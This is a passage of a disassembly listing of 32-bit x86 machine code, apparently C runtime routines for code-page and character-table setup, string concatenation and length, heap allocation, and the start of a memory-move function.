  4045c3:	5e                   	pop    %esi
  4045c4:	5d                   	pop    %ebp
  4045c5:	c3                   	ret
  4045c6:	55                   	push   %ebp
  4045c7:	8b ec                	mov    %esp,%ebp
  4045c9:	8b 45 08             	mov    0x8(%ebp),%eax
  4045cc:	ff 34 85 48 88 40 00 	push   0x408848(,%eax,4)
  4045d3:	ff 15 c4 70 40 00    	call   *0x4070c4
  4045d9:	5d                   	pop    %ebp
  4045da:	c3                   	ret
  4045db:	6a 04                	push   $0x4
  4045dd:	6a 00                	push   $0x0
  4045df:	ff 74 24 0c          	push   0xc(%esp)
  4045e3:	e8 04 00 00 00       	call   0x4045ec
  4045e8:	83 c4 0c             	add    $0xc,%esp
  4045eb:	c3                   	ret
  4045ec:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  4045f1:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  4045f5:	84 88 a1 9a 40 00    	test   %cl,0x409aa1(%eax)
  4045fb:	75 1c                	jne    0x404619
  4045fd:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  404602:	74 0e                	je     0x404612
  404604:	0f b7 04 45 1a 8a 40 	movzwl 0x408a1a(,%eax,2),%eax
  40460b:	00 
  40460c:	23 44 24 08          	and    0x8(%esp),%eax
  404610:	eb 02                	jmp    0x404614
  404612:	33 c0                	xor    %eax,%eax
  404614:	85 c0                	test   %eax,%eax
  404616:	75 01                	jne    0x404619
  404618:	c3                   	ret
  404619:	6a 01                	push   $0x1
  40461b:	58                   	pop    %eax
  40461c:	c3                   	ret
  40461d:	55                   	push   %ebp
  40461e:	8b ec                	mov    %esp,%ebp
  404620:	83 ec 18             	sub    $0x18,%esp
  404623:	53                   	push   %ebx
  404624:	56                   	push   %esi
  404625:	57                   	push   %edi
  404626:	6a 19                	push   $0x19
  404628:	e8 38 ff ff ff       	call   0x404565
  40462d:	ff 75 08             	push   0x8(%ebp)
  404630:	e8 95 01 00 00       	call   0x4047ca
  404635:	8b d8                	mov    %eax,%ebx
  404637:	59                   	pop    %ecx
  404638:	3b 1d 70 99 40 00    	cmp    0x409970,%ebx
  40463e:	59                   	pop    %ecx
  40463f:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404642:	75 07                	jne    0x40464b
  404644:	33 f6                	xor    %esi,%esi
  404646:	e9 70 01 00 00       	jmp    0x4047bb
  40464b:	85 db                	test   %ebx,%ebx
  40464d:	0f 84 56 01 00 00    	je     0x4047a9
  404653:	33 d2                	xor    %edx,%edx
  404655:	b8 10 89 40 00       	mov    $0x408910,%eax
  40465a:	39 18                	cmp    %ebx,(%eax)
  40465c:	74 74                	je     0x4046d2
  40465e:	83 c0 30             	add    $0x30,%eax
  404661:	42                   	inc    %edx
  404662:	3d 00 8a 40 00       	cmp    $0x408a00,%eax
  404667:	7c f1                	jl     0x40465a
  404669:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40466c:	50                   	push   %eax
  40466d:	53                   	push   %ebx
  40466e:	ff 15 c0 70 40 00    	call   *0x4070c0
  404674:	6a 01                	push   $0x1
  404676:	5e                   	pop    %esi
  404677:	3b c6                	cmp    %esi,%eax
  404679:	0f 85 21 01 00 00    	jne    0x4047a0
  40467f:	6a 40                	push   $0x40
  404681:	83 25 a4 9b 40 00 00 	andl   $0x0,0x409ba4
  404688:	59                   	pop    %ecx
  404689:	33 c0                	xor    %eax,%eax
  40468b:	bf a0 9a 40 00       	mov    $0x409aa0,%edi
  404690:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  404693:	f3 ab                	rep stos %eax,%es:(%edi)
  404695:	aa                   	stos   %al,%es:(%edi)
  404696:	89 1d 70 99 40 00    	mov    %ebx,0x409970
  40469c:	0f 86 eb 00 00 00    	jbe    0x40478d
  4046a2:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  4046a6:	0f 84 bc 00 00 00    	je     0x404768
  4046ac:	8d 4d ef             	lea    -0x11(%ebp),%ecx
  4046af:	8a 11                	mov    (%ecx),%dl
  4046b1:	84 d2                	test   %dl,%dl
  4046b3:	0f 84 af 00 00 00    	je     0x404768
  4046b9:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  4046bd:	0f b6 d2             	movzbl %dl,%edx
  4046c0:	3b c2                	cmp    %edx,%eax
  4046c2:	0f 87 94 00 00 00    	ja     0x40475c
  4046c8:	80 88 a1 9a 40 00 04 	orb    $0x4,0x409aa1(%eax)
  4046cf:	40                   	inc    %eax
  4046d0:	eb ee                	jmp    0x4046c0
  4046d2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4046d6:	6a 40                	push   $0x40
  4046d8:	59                   	pop    %ecx
  4046d9:	33 c0                	xor    %eax,%eax
  4046db:	bf a0 9a 40 00       	mov    $0x409aa0,%edi
  4046e0:	8d 34 52             	lea    (%edx,%edx,2),%esi
  4046e3:	f3 ab                	rep stos %eax,%es:(%edi)
  4046e5:	c1 e6 04             	shl    $0x4,%esi
  4046e8:	aa                   	stos   %al,%es:(%edi)
  4046e9:	8d 9e 20 89 40 00    	lea    0x408920(%esi),%ebx
  4046ef:	80 3b 00             	cmpb   $0x0,(%ebx)
  4046f2:	8b cb                	mov    %ebx,%ecx
  4046f4:	74 2c                	je     0x404722
  4046f6:	8a 51 01             	mov    0x1(%ecx),%dl
  4046f9:	84 d2                	test   %dl,%dl
  4046fb:	74 25                	je     0x404722
  4046fd:	0f b6 01             	movzbl (%ecx),%eax
  404700:	0f b6 fa             	movzbl %dl,%edi
  404703:	3b c7                	cmp    %edi,%eax
  404705:	77 14                	ja     0x40471b
  404707:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40470a:	8a 92 08 89 40 00    	mov    0x408908(%edx),%dl
  404710:	08 90 a1 9a 40 00    	or     %dl,0x409aa1(%eax)
  404716:	40                   	inc    %eax
  404717:	3b c7                	cmp    %edi,%eax
  404719:	76 f5                	jbe    0x404710
  40471b:	41                   	inc    %ecx
  40471c:	41                   	inc    %ecx
  40471d:	80 39 00             	cmpb   $0x0,(%ecx)
  404720:	75 d4                	jne    0x4046f6
  404722:	ff 45 fc             	incl   -0x4(%ebp)
  404725:	83 c3 08             	add    $0x8,%ebx
  404728:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  40472c:	72 c1                	jb     0x4046ef
  40472e:	8b 45 08             	mov    0x8(%ebp),%eax
  404731:	c7 05 8c 99 40 00 01 	movl   $0x1,0x40998c
  404738:	00 00 00 
  40473b:	50                   	push   %eax
  40473c:	a3 70 99 40 00       	mov    %eax,0x409970
  404741:	e8 ce 00 00 00       	call   0x404814
  404746:	8d b6 14 89 40 00    	lea    0x408914(%esi),%esi
  40474c:	bf 80 99 40 00       	mov    $0x409980,%edi
  404751:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404752:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404753:	59                   	pop    %ecx
  404754:	a3 a4 9b 40 00       	mov    %eax,0x409ba4
  404759:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40475a:	eb 52                	jmp    0x4047ae
  40475c:	41                   	inc    %ecx
  40475d:	41                   	inc    %ecx
  40475e:	80 79 ff 00          	cmpb   $0x0,-0x1(%ecx)
  404762:	0f 85 47 ff ff ff    	jne    0x4046af
  404768:	8b c6                	mov    %esi,%eax
  40476a:	80 88 a1 9a 40 00 08 	orb    $0x8,0x409aa1(%eax)
  404771:	40                   	inc    %eax
  404772:	3d ff 00 00 00       	cmp    $0xff,%eax
  404777:	72 f1                	jb     0x40476a
  404779:	53                   	push   %ebx
  40477a:	e8 95 00 00 00       	call   0x404814
  40477f:	59                   	pop    %ecx
  404780:	a3 a4 9b 40 00       	mov    %eax,0x409ba4
  404785:	89 35 8c 99 40 00    	mov    %esi,0x40998c
  40478b:	eb 07                	jmp    0x404794
  40478d:	83 25 8c 99 40 00 00 	andl   $0x0,0x40998c
  404794:	33 c0                	xor    %eax,%eax
  404796:	bf 80 99 40 00       	mov    $0x409980,%edi
  40479b:	ab                   	stos   %eax,%es:(%edi)
  40479c:	ab                   	stos   %eax,%es:(%edi)
  40479d:	ab                   	stos   %eax,%es:(%edi)
  40479e:	eb 0e                	jmp    0x4047ae
  4047a0:	83 3d 18 99 40 00 00 	cmpl   $0x0,0x409918
  4047a7:	74 0f                	je     0x4047b8
  4047a9:	e8 99 00 00 00       	call   0x404847
  4047ae:	e8 bd 00 00 00       	call   0x404870
  4047b3:	e9 8c fe ff ff       	jmp    0x404644
  4047b8:	83 ce ff             	or     $0xffffffff,%esi
  4047bb:	6a 19                	push   $0x19
  4047bd:	e8 04 fe ff ff       	call   0x4045c6
  4047c2:	59                   	pop    %ecx
  4047c3:	8b c6                	mov    %esi,%eax
  4047c5:	5f                   	pop    %edi
  4047c6:	5e                   	pop    %esi
  4047c7:	5b                   	pop    %ebx
  4047c8:	c9                   	leave
  4047c9:	c3                   	ret
  4047ca:	8b 44 24 04          	mov    0x4(%esp),%eax
  4047ce:	83 25 18 99 40 00 00 	andl   $0x0,0x409918
  4047d5:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4047d8:	75 10                	jne    0x4047ea
  4047da:	c7 05 18 99 40 00 01 	movl   $0x1,0x409918
  4047e1:	00 00 00 
  4047e4:	ff 25 b8 70 40 00    	jmp    *0x4070b8
  4047ea:	83 f8 fd             	cmp    $0xfffffffd,%eax
  4047ed:	75 10                	jne    0x4047ff
  4047ef:	c7 05 18 99 40 00 01 	movl   $0x1,0x409918
  4047f6:	00 00 00 
  4047f9:	ff 25 bc 70 40 00    	jmp    *0x4070bc
  4047ff:	83 f8 fc             	cmp    $0xfffffffc,%eax
  404802:	75 0f                	jne    0x404813
  404804:	a1 40 99 40 00       	mov    0x409940,%eax
  404809:	c7 05 18 99 40 00 01 	movl   $0x1,0x409918
  404810:	00 00 00 
  404813:	c3                   	ret
  404814:	8b 44 24 04          	mov    0x4(%esp),%eax
  404818:	2d a4 03 00 00       	sub    $0x3a4,%eax
  40481d:	74 22                	je     0x404841
  40481f:	83 e8 04             	sub    $0x4,%eax
  404822:	74 17                	je     0x40483b
  404824:	83 e8 0d             	sub    $0xd,%eax
  404827:	74 0c                	je     0x404835
  404829:	48                   	dec    %eax
  40482a:	74 03                	je     0x40482f
  40482c:	33 c0                	xor    %eax,%eax
  40482e:	c3                   	ret
  40482f:	b8 04 04 00 00       	mov    $0x404,%eax
  404834:	c3                   	ret
  404835:	b8 12 04 00 00       	mov    $0x412,%eax
  40483a:	c3                   	ret
  40483b:	b8 04 08 00 00       	mov    $0x804,%eax
  404840:	c3                   	ret
  404841:	b8 11 04 00 00       	mov    $0x411,%eax
  404846:	c3                   	ret
  404847:	57                   	push   %edi
  404848:	6a 40                	push   $0x40
  40484a:	59                   	pop    %ecx
  40484b:	33 c0                	xor    %eax,%eax
  40484d:	bf a0 9a 40 00       	mov    $0x409aa0,%edi
  404852:	f3 ab                	rep stos %eax,%es:(%edi)
  404854:	aa                   	stos   %al,%es:(%edi)
  404855:	33 c0                	xor    %eax,%eax
  404857:	bf 80 99 40 00       	mov    $0x409980,%edi
  40485c:	a3 70 99 40 00       	mov    %eax,0x409970
  404861:	a3 8c 99 40 00       	mov    %eax,0x40998c
  404866:	a3 a4 9b 40 00       	mov    %eax,0x409ba4
  40486b:	ab                   	stos   %eax,%es:(%edi)
  40486c:	ab                   	stos   %eax,%es:(%edi)
  40486d:	ab                   	stos   %eax,%es:(%edi)
  40486e:	5f                   	pop    %edi
  40486f:	c3                   	ret
  404870:	55                   	push   %ebp
  404871:	8b ec                	mov    %esp,%ebp
  404873:	81 ec 14 05 00 00    	sub    $0x514,%esp
  404879:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40487c:	56                   	push   %esi
  40487d:	50                   	push   %eax
  40487e:	ff 35 70 99 40 00    	push   0x409970
  404884:	ff 15 c0 70 40 00    	call   *0x4070c0
  40488a:	83 f8 01             	cmp    $0x1,%eax
  40488d:	0f 85 16 01 00 00    	jne    0x4049a9
  404893:	33 c0                	xor    %eax,%eax
  404895:	be 00 01 00 00       	mov    $0x100,%esi
  40489a:	88 84 05 ec fe ff ff 	mov    %al,-0x114(%ebp,%eax,1)
  4048a1:	40                   	inc    %eax
  4048a2:	3b c6                	cmp    %esi,%eax
  4048a4:	72 f4                	jb     0x40489a
  4048a6:	8a 45 f2             	mov    -0xe(%ebp),%al
  4048a9:	c6 85 ec fe ff ff 20 	movb   $0x20,-0x114(%ebp)
  4048b0:	84 c0                	test   %al,%al
  4048b2:	74 37                	je     0x4048eb
  4048b4:	53                   	push   %ebx
  4048b5:	57                   	push   %edi
  4048b6:	8d 55 f3             	lea    -0xd(%ebp),%edx
  4048b9:	0f b6 0a             	movzbl (%edx),%ecx
  4048bc:	0f b6 c0             	movzbl %al,%eax
  4048bf:	3b c1                	cmp    %ecx,%eax
  4048c1:	77 1d                	ja     0x4048e0
  4048c3:	2b c8                	sub    %eax,%ecx
  4048c5:	8d bc 05 ec fe ff ff 	lea    -0x114(%ebp,%eax,1),%edi
  4048cc:	41                   	inc    %ecx
  4048cd:	b8 20 20 20 20       	mov    $0x20202020,%eax
  4048d2:	8b d9                	mov    %ecx,%ebx
  4048d4:	c1 e9 02             	shr    $0x2,%ecx
  4048d7:	f3 ab                	rep stos %eax,%es:(%edi)
  4048d9:	8b cb                	mov    %ebx,%ecx
  4048db:	83 e1 03             	and    $0x3,%ecx
  4048de:	f3 aa                	rep stos %al,%es:(%edi)
  4048e0:	42                   	inc    %edx
  4048e1:	42                   	inc    %edx
  4048e2:	8a 42 ff             	mov    -0x1(%edx),%al
  4048e5:	84 c0                	test   %al,%al
  4048e7:	75 d0                	jne    0x4048b9
  4048e9:	5f                   	pop    %edi
  4048ea:	5b                   	pop    %ebx
  4048eb:	6a 00                	push   $0x0
  4048ed:	8d 85 ec fa ff ff    	lea    -0x514(%ebp),%eax
  4048f3:	ff 35 a4 9b 40 00    	push   0x409ba4
  4048f9:	ff 35 70 99 40 00    	push   0x409970
  4048ff:	50                   	push   %eax
  404900:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  404906:	56                   	push   %esi
  404907:	50                   	push   %eax
  404908:	6a 01                	push   $0x1
  40490a:	e8 3e 13 00 00       	call   0x405c4d
  40490f:	6a 00                	push   $0x0
  404911:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  404917:	ff 35 70 99 40 00    	push   0x409970
  40491d:	56                   	push   %esi
  40491e:	50                   	push   %eax
  40491f:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  404925:	56                   	push   %esi
  404926:	50                   	push   %eax
  404927:	56                   	push   %esi
  404928:	ff 35 a4 9b 40 00    	push   0x409ba4
  40492e:	e8 cb 10 00 00       	call   0x4059fe
  404933:	6a 00                	push   $0x0
  404935:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  40493b:	ff 35 70 99 40 00    	push   0x409970
  404941:	56                   	push   %esi
  404942:	50                   	push   %eax
  404943:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  404949:	56                   	push   %esi
  40494a:	50                   	push   %eax
  40494b:	68 00 02 00 00       	push   $0x200
  404950:	ff 35 a4 9b 40 00    	push   0x409ba4
  404956:	e8 a3 10 00 00       	call   0x4059fe
  40495b:	83 c4 5c             	add    $0x5c,%esp
  40495e:	33 c0                	xor    %eax,%eax
  404960:	8d 8d ec fa ff ff    	lea    -0x514(%ebp),%ecx
  404966:	66 8b 11             	mov    (%ecx),%dx
  404969:	f6 c2 01             	test   $0x1,%dl
  40496c:	74 16                	je     0x404984
  40496e:	80 88 a1 9a 40 00 10 	orb    $0x10,0x409aa1(%eax)
  404975:	8a 94 05 ec fd ff ff 	mov    -0x214(%ebp,%eax,1),%dl
  40497c:	88 90 a0 99 40 00    	mov    %dl,0x4099a0(%eax)
  404982:	eb 1c                	jmp    0x4049a0
  404984:	f6 c2 02             	test   $0x2,%dl
  404987:	74 10                	je     0x404999
  404989:	80 88 a1 9a 40 00 20 	orb    $0x20,0x409aa1(%eax)
  404990:	8a 94 05 ec fc ff ff 	mov    -0x314(%ebp,%eax,1),%dl
  404997:	eb e3                	jmp    0x40497c
  404999:	80 a0 a0 99 40 00 00 	andb   $0x0,0x4099a0(%eax)
  4049a0:	40                   	inc    %eax
  4049a1:	41                   	inc    %ecx
  4049a2:	41                   	inc    %ecx
  4049a3:	3b c6                	cmp    %esi,%eax
  4049a5:	72 bf                	jb     0x404966
  4049a7:	eb 49                	jmp    0x4049f2
  4049a9:	33 c0                	xor    %eax,%eax
  4049ab:	be 00 01 00 00       	mov    $0x100,%esi
  4049b0:	83 f8 41             	cmp    $0x41,%eax
  4049b3:	72 19                	jb     0x4049ce
  4049b5:	83 f8 5a             	cmp    $0x5a,%eax
  4049b8:	77 14                	ja     0x4049ce
  4049ba:	80 88 a1 9a 40 00 10 	orb    $0x10,0x409aa1(%eax)
  4049c1:	8a c8                	mov    %al,%cl
  4049c3:	80 c1 20             	add    $0x20,%cl
  4049c6:	88 88 a0 99 40 00    	mov    %cl,0x4099a0(%eax)
  4049cc:	eb 1f                	jmp    0x4049ed
  4049ce:	83 f8 61             	cmp    $0x61,%eax
  4049d1:	72 13                	jb     0x4049e6
  4049d3:	83 f8 7a             	cmp    $0x7a,%eax
  4049d6:	77 0e                	ja     0x4049e6
  4049d8:	80 88 a1 9a 40 00 20 	orb    $0x20,0x409aa1(%eax)
  4049df:	8a c8                	mov    %al,%cl
  4049e1:	80 e9 20             	sub    $0x20,%cl
  4049e4:	eb e0                	jmp    0x4049c6
  4049e6:	80 a0 a0 99 40 00 00 	andb   $0x0,0x4099a0(%eax)
  4049ed:	40                   	inc    %eax
  4049ee:	3b c6                	cmp    %esi,%eax
  4049f0:	72 be                	jb     0x4049b0
  4049f2:	5e                   	pop    %esi
  4049f3:	c9                   	leave
  4049f4:	c3                   	ret
  4049f5:	83 3d c8 9c 40 00 00 	cmpl   $0x0,0x409cc8
  4049fc:	75 12                	jne    0x404a10
  4049fe:	6a fd                	push   $0xfffffffd
  404a00:	e8 18 fc ff ff       	call   0x40461d
  404a05:	59                   	pop    %ecx
  404a06:	c7 05 c8 9c 40 00 01 	movl   $0x1,0x409cc8
  404a0d:	00 00 00 
  404a10:	c3                   	ret
  404a11:	56                   	push   %esi
  404a12:	8b 74 24 08          	mov    0x8(%esp),%esi
  404a16:	85 f6                	test   %esi,%esi
  404a18:	74 3d                	je     0x404a57
  404a1a:	6a 09                	push   $0x9
  404a1c:	e8 44 fb ff ff       	call   0x404565
  404a21:	56                   	push   %esi
  404a22:	e8 39 06 00 00       	call   0x405060
  404a27:	59                   	pop    %ecx
  404a28:	85 c0                	test   %eax,%eax
  404a2a:	59                   	pop    %ecx
  404a2b:	74 13                	je     0x404a40
  404a2d:	56                   	push   %esi
  404a2e:	50                   	push   %eax
  404a2f:	e8 57 06 00 00       	call   0x40508b
  404a34:	6a 09                	push   $0x9
  404a36:	e8 8b fb ff ff       	call   0x4045c6
  404a3b:	83 c4 0c             	add    $0xc,%esp
  404a3e:	5e                   	pop    %esi
  404a3f:	c3                   	ret
  404a40:	6a 09                	push   $0x9
  404a42:	e8 7f fb ff ff       	call   0x4045c6
  404a47:	59                   	pop    %ecx
  404a48:	56                   	push   %esi
  404a49:	6a 00                	push   $0x0
  404a4b:	ff 35 a8 9b 40 00    	push   0x409ba8
  404a51:	ff 15 6c 70 40 00    	call   *0x40706c
  404a57:	5e                   	pop    %esi
  404a58:	c3                   	ret
  404a59:	cc                   	int3
  404a5a:	cc                   	int3
  404a5b:	cc                   	int3
  404a5c:	cc                   	int3
  404a5d:	cc                   	int3
  404a5e:	cc                   	int3
  404a5f:	cc                   	int3
  404a60:	57                   	push   %edi
  404a61:	8b 7c 24 08          	mov    0x8(%esp),%edi
  404a65:	eb 6a                	jmp    0x404ad1
  404a67:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404a6e:	8b ff                	mov    %edi,%edi
  404a70:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a74:	57                   	push   %edi
  404a75:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404a7b:	74 0f                	je     0x404a8c
  404a7d:	8a 01                	mov    (%ecx),%al
  404a7f:	41                   	inc    %ecx
  404a80:	84 c0                	test   %al,%al
  404a82:	74 3b                	je     0x404abf
  404a84:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404a8a:	75 f1                	jne    0x404a7d
  404a8c:	8b 01                	mov    (%ecx),%eax
  404a8e:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  404a93:	03 d0                	add    %eax,%edx
  404a95:	83 f0 ff             	xor    $0xffffffff,%eax
  404a98:	33 c2                	xor    %edx,%eax
  404a9a:	83 c1 04             	add    $0x4,%ecx
  404a9d:	a9 00 01 01 81       	test   $0x81010100,%eax
  404aa2:	74 e8                	je     0x404a8c
  404aa4:	8b 41 fc             	mov    -0x4(%ecx),%eax
  404aa7:	84 c0                	test   %al,%al
  404aa9:	74 23                	je     0x404ace
  404aab:	84 e4                	test   %ah,%ah
  404aad:	74 1a                	je     0x404ac9
  404aaf:	a9 00 00 ff 00       	test   $0xff0000,%eax
  404ab4:	74 0e                	je     0x404ac4
  404ab6:	a9 00 00 00 ff       	test   $0xff000000,%eax
  404abb:	74 02                	je     0x404abf
  404abd:	eb cd                	jmp    0x404a8c
  404abf:	8d 79 ff             	lea    -0x1(%ecx),%edi
  404ac2:	eb 0d                	jmp    0x404ad1
  404ac4:	8d 79 fe             	lea    -0x2(%ecx),%edi
  404ac7:	eb 08                	jmp    0x404ad1
  404ac9:	8d 79 fd             	lea    -0x3(%ecx),%edi
  404acc:	eb 03                	jmp    0x404ad1
  404ace:	8d 79 fc             	lea    -0x4(%ecx),%edi
  404ad1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404ad5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404adb:	74 19                	je     0x404af6
  404add:	8a 11                	mov    (%ecx),%dl
  404adf:	41                   	inc    %ecx
  404ae0:	84 d2                	test   %dl,%dl
  404ae2:	74 64                	je     0x404b48
  404ae4:	88 17                	mov    %dl,(%edi)
  404ae6:	47                   	inc    %edi
  404ae7:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404aed:	75 ee                	jne    0x404add
  404aef:	eb 05                	jmp    0x404af6
  404af1:	89 17                	mov    %edx,(%edi)
  404af3:	83 c7 04             	add    $0x4,%edi
  404af6:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  404afb:	8b 01                	mov    (%ecx),%eax
  404afd:	03 d0                	add    %eax,%edx
  404aff:	83 f0 ff             	xor    $0xffffffff,%eax
  404b02:	33 c2                	xor    %edx,%eax
  404b04:	8b 11                	mov    (%ecx),%edx
  404b06:	83 c1 04             	add    $0x4,%ecx
  404b09:	a9 00 01 01 81       	test   $0x81010100,%eax
  404b0e:	74 e1                	je     0x404af1
  404b10:	84 d2                	test   %dl,%dl
  404b12:	74 34                	je     0x404b48
  404b14:	84 f6                	test   %dh,%dh
  404b16:	74 27                	je     0x404b3f
  404b18:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  404b1e:	74 12                	je     0x404b32
  404b20:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  404b26:	74 02                	je     0x404b2a
  404b28:	eb c7                	jmp    0x404af1
  404b2a:	89 17                	mov    %edx,(%edi)
  404b2c:	8b 44 24 08          	mov    0x8(%esp),%eax
  404b30:	5f                   	pop    %edi
  404b31:	c3                   	ret
  404b32:	66 89 17             	mov    %dx,(%edi)
  404b35:	8b 44 24 08          	mov    0x8(%esp),%eax
  404b39:	c6 47 02 00          	movb   $0x0,0x2(%edi)
  404b3d:	5f                   	pop    %edi
  404b3e:	c3                   	ret
  404b3f:	66 89 17             	mov    %dx,(%edi)
  404b42:	8b 44 24 08          	mov    0x8(%esp),%eax
  404b46:	5f                   	pop    %edi
  404b47:	c3                   	ret
  404b48:	88 17                	mov    %dl,(%edi)
  404b4a:	8b 44 24 08          	mov    0x8(%esp),%eax
  404b4e:	5f                   	pop    %edi
  404b4f:	c3                   	ret
  404b50:	ff 35 50 99 40 00    	push   0x409950
  404b56:	ff 74 24 08          	push   0x8(%esp)
  404b5a:	e8 03 00 00 00       	call   0x404b62
  404b5f:	59                   	pop    %ecx
  404b60:	59                   	pop    %ecx
  404b61:	c3                   	ret
  404b62:	83 7c 24 04 e0       	cmpl   $0xffffffe0,0x4(%esp)
  404b67:	77 22                	ja     0x404b8b
  404b69:	ff 74 24 04          	push   0x4(%esp)
  404b6d:	e8 1c 00 00 00       	call   0x404b8e
  404b72:	85 c0                	test   %eax,%eax
  404b74:	59                   	pop    %ecx
  404b75:	75 16                	jne    0x404b8d
  404b77:	39 44 24 08          	cmp    %eax,0x8(%esp)
  404b7b:	74 10                	je     0x404b8d
  404b7d:	ff 74 24 04          	push   0x4(%esp)
  404b81:	e8 10 12 00 00       	call   0x405d96
  404b86:	85 c0                	test   %eax,%eax
  404b88:	59                   	pop    %ecx
  404b89:	75 de                	jne    0x404b69
  404b8b:	33 c0                	xor    %eax,%eax
  404b8d:	c3                   	ret
  404b8e:	56                   	push   %esi
  404b8f:	8b 74 24 08          	mov    0x8(%esp),%esi
  404b93:	3b 35 00 8a 40 00    	cmp    0x408a00,%esi
  404b99:	57                   	push   %edi
  404b9a:	77 21                	ja     0x404bbd
  404b9c:	6a 09                	push   $0x9
  404b9e:	e8 c2 f9 ff ff       	call   0x404565
  404ba3:	56                   	push   %esi
  404ba4:	e8 0d 08 00 00       	call   0x4053b6
  404ba9:	6a 09                	push   $0x9
  404bab:	8b f8                	mov    %eax,%edi
  404bad:	e8 14 fa ff ff       	call   0x4045c6
  404bb2:	83 c4 0c             	add    $0xc,%esp
  404bb5:	85 ff                	test   %edi,%edi
  404bb7:	74 04                	je     0x404bbd
  404bb9:	8b c7                	mov    %edi,%eax
  404bbb:	eb 1c                	jmp    0x404bd9
  404bbd:	85 f6                	test   %esi,%esi
  404bbf:	75 03                	jne    0x404bc4
  404bc1:	6a 01                	push   $0x1
  404bc3:	5e                   	pop    %esi
  404bc4:	83 c6 0f             	add    $0xf,%esi
  404bc7:	83 e6 f0             	and    $0xfffffff0,%esi
  404bca:	56                   	push   %esi
  404bcb:	6a 00                	push   $0x0
  404bcd:	ff 35 a8 9b 40 00    	push   0x409ba8
  404bd3:	ff 15 94 70 40 00    	call   *0x407094
  404bd9:	5f                   	pop    %edi
  404bda:	5e                   	pop    %esi
  404bdb:	c3                   	ret
  404bdc:	cc                   	int3
  404bdd:	cc                   	int3
  404bde:	cc                   	int3
  404bdf:	cc                   	int3
  404be0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404be4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404bea:	74 14                	je     0x404c00
  404bec:	8a 01                	mov    (%ecx),%al
  404bee:	41                   	inc    %ecx
  404bef:	84 c0                	test   %al,%al
  404bf1:	74 40                	je     0x404c33
  404bf3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  404bf9:	75 f1                	jne    0x404bec
  404bfb:	05 00 00 00 00       	add    $0x0,%eax
  404c00:	8b 01                	mov    (%ecx),%eax
  404c02:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  404c07:	03 d0                	add    %eax,%edx
  404c09:	83 f0 ff             	xor    $0xffffffff,%eax
  404c0c:	33 c2                	xor    %edx,%eax
  404c0e:	83 c1 04             	add    $0x4,%ecx
  404c11:	a9 00 01 01 81       	test   $0x81010100,%eax
  404c16:	74 e8                	je     0x404c00
  404c18:	8b 41 fc             	mov    -0x4(%ecx),%eax
  404c1b:	84 c0                	test   %al,%al
  404c1d:	74 32                	je     0x404c51
  404c1f:	84 e4                	test   %ah,%ah
  404c21:	74 24                	je     0x404c47
  404c23:	a9 00 00 ff 00       	test   $0xff0000,%eax
  404c28:	74 13                	je     0x404c3d
  404c2a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  404c2f:	74 02                	je     0x404c33
  404c31:	eb cd                	jmp    0x404c00
  404c33:	8d 41 ff             	lea    -0x1(%ecx),%eax
  404c36:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404c3a:	2b c1                	sub    %ecx,%eax
  404c3c:	c3                   	ret
  404c3d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  404c40:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404c44:	2b c1                	sub    %ecx,%eax
  404c46:	c3                   	ret
  404c47:	8d 41 fd             	lea    -0x3(%ecx),%eax
  404c4a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404c4e:	2b c1                	sub    %ecx,%eax
  404c50:	c3                   	ret
  404c51:	8d 41 fc             	lea    -0x4(%ecx),%eax
  404c54:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404c58:	2b c1                	sub    %ecx,%eax
  404c5a:	c3                   	ret
  404c5b:	cc                   	int3
  404c5c:	cc                   	int3
  404c5d:	cc                   	int3
  404c5e:	cc                   	int3
  404c5f:	cc                   	int3
  404c60:	55                   	push   %ebp
  404c61:	8b ec                	mov    %esp,%ebp
  404c63:	57                   	push   %edi
  404c64:	56                   	push   %esi
  404c65:	8b 75 0c             	mov    0xc(%ebp),%esi
  404c68:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404c6b:	8b 7d 08             	mov    0x8(%ebp),%edi
  404c6e:	8b c1                	mov    %ecx,%eax
  404c70:	8b d1                	mov    %ecx,%edx
  404c72:	03 c6                	add    %esi,%eax
  404c74:	3b fe                	cmp    %esi,%edi
  404c76:	76 08                	jbe    0x404c80
  404c78:	3b f8                	cmp    %eax,%edi
  404c7a:	0f 82 78 01 00 00    	jb     0x404df8
